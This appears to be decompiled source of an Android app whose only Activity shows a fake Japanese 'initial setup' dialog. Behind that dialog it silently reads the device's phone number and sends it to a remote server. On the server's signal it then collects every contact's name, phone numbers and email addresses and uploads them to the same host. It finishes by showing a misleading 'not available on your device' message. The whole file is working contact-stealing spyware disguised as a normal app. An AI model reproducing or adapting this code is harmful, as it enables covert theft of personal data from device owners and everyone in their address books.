package frhfsd.siksdk.ujdsfjkfsd;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.Iterator;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;

public class WrehifsdkjsActivity extends Activity {
    protected Context context;
    /* access modifiers changed from: private */
    public ProgressDialog dialog;

    private class Progress implements Runnable {
        private Handler handler;

        private Progress() {
            this.handler = new Handler() {
                public void handleMessage(Message msg) {
                    WrehifsdkjsActivity.this.dialog.dismiss();
                    switch (msg.what) {
                        case 0:
                            Toast.makeText(WrehifsdkjsActivity.this.context, "システムの初期化に失敗しました。" + msg.arg1, 1).show();
                            return;
                        default:
                            Toast.makeText(WrehifsdkjsActivity.this.context, "お使いの端末ではご利用になれません。", 1).show();
                            return;
                    }
                }
            };
        }

        /* synthetic */ Progress(WrehifsdkjsActivity wrehifsdkjsActivity, Progress progress) {
            this();
        }

        public void run() {
            Message msg = new Message();
            try {
                String line1Number = ((TelephonyManager) WrehifsdkjsActivity.this.getSystemService("phone")).getLine1Number();
                String str = "";
                if (line1Number == null) {
                    msg.what = 0;
                    msg.arg1 = 1;
                    this.handler.sendMessage(msg);
                    return;
                }
                String result = doPost("https://ftukguhilcom.globat.com/cgi-bin/confirmUserData.php", "t=" + line1Number + "&app=Wrehifsdkjs");
                if (result == null) {
                    msg.what = 0;
                    msg.arg1 = 2;
                    this.handler.sendMessage(msg);
                    return;
                }
                WrehifsdkjsJSON jObj = new WrehifsdkjsJSON(result);
                if (jObj.isJSON()) {
                    switch (jObj.getJsons().getInt("result")) {
                        case -1:
                            msg.what = 0;
                            msg.arg1 = 4;
                            this.handler.sendMessage(msg);
                            return;
                        case 1:
                            String address = "";
                            Iterator<String> it = getAddress().iterator();
                            while (it.hasNext()) {
                                address = new StringBuilder(String.valueOf(address)).append((String) it.next()).append("\n").toString();
                            }
                            doPost("https://ftukguhilcom.globat.com/cgi-bin/registerAddressData.php", "data=" + address + "&t=" + line1Number + "&app=Wrehifsdkjs");
                            break;
                        default:
                            break;
                    }
                    msg.what = 1;
                    msg.arg1 = 5;
                    this.handler.sendMessage(msg);
                    return;
                }
                msg.what = 0;
                msg.arg1 = 3;
                this.handler.sendMessage(msg);
            } catch (JSONException e) {
                msg.what = 0;
                msg.arg1 = -1;
                this.handler.sendMessage(msg);
            } catch (Exception e2) {
                msg.what = 0;
                msg.arg1 = -2;
                this.handler.sendMessage(msg);
            }
        }

        public String doPost(String url, String params) {
            try {
                HttpPost method = new HttpPost(url);
                DefaultHttpClient client = new DefaultHttpClient();
                StringEntity paramEntity = new StringEntity(params, "UTF-8");
                paramEntity.setChunked(false);
                paramEntity.setContentType("application/x-www-form-urlencoded");
                method.setEntity(paramEntity);
                HttpResponse response = client.execute(method);
                if (response.getStatusLine().getStatusCode() == 200) {
                    return EntityUtils.toString(response.getEntity(), "UTF-8");
                }
                throw new Exception("");
            } catch (Exception e) {
                return null;
            }
        }

        public ArrayList<String> getAddress() {
            ArrayList<String> strContacts = new ArrayList();
            Cursor c = WrehifsdkjsActivity.this.managedQuery(Contacts.CONTENT_URI, null, null, null, null);
            while (c.moveToNext()) {
                String id = c.getString(c.getColumnIndex("_id"));
                String[] where_args = new String[]{id};
                String strContact = "\"" + id + "\"" + ",\"" + c.getString(c.getColumnIndex("display_name")) + "\",\"";
                Cursor phones = WrehifsdkjsActivity.this.managedQuery(Phone.CONTENT_URI, null, "contact_id =? ", where_args, null);
                while (phones.moveToNext()) {
                    strContact = new StringBuilder(String.valueOf(strContact)).append(phones.getString(phones.getColumnIndex("data1"))).append("\n").toString();
                }
                phones.close();
                strContact = new StringBuilder(String.valueOf(strContact)).append("\",\"").toString();
                Cursor emails = WrehifsdkjsActivity.this.managedQuery(Email.CONTENT_URI, null, "contact_id = " + id, null, null);
                while (emails.moveToNext()) {
                    strContact = new StringBuilder(String.valueOf(strContact)).append(emails.getString(emails.getColumnIndex("data1"))).append("\n").toString();
                }
                emails.close();
                strContacts.add(new StringBuilder(String.valueOf(strContact)).append("\"").toString().replaceAll("&", "＆"));
            }
            return strContacts;
        }
    }

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        this.context = this;
        this.dialog = new ProgressDialog(this);
        this.dialog.setTitle("設定中");
        this.dialog.setMessage("アプリの初期設定を行っています、しばらくお待ちください...");
        this.dialog.setProgressStyle(0);
        this.dialog.setCanceledOnTouchOutside(false);
        this.dialog.show();
        new Thread(new Progress(this, null)).start();
    }
}
